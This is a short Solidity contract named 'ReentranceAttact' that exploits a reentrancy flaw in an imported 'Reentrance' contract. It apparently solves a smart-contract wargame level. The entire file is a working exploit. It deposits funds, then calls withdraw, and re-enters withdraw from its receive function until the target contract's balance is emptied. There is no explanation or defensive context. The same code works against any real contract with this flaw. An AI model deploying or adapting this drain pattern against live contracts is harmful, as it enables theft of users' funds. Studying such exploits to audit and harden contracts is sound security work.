// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttact {
    Reentrance holder;
    uint256 initialAmount;
    
    constructor(address _holder) public {
        holder = Reentrance(payable(_holder));
    }

    function attack() external payable {
        initialAmount = msg.value; 
        holder.donate{value: initialAmount}(address(this));

        callWithdraw();
    }
    
    receive() external payable {
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 leftover = address(holder).balance;
         bool keepRecursing = leftover > 0;

        if (keepRecursing) {
            uint256 amount = initialAmount > leftover ? leftover : initialAmount;
            holder.withdraw(amount);
        }
    }
}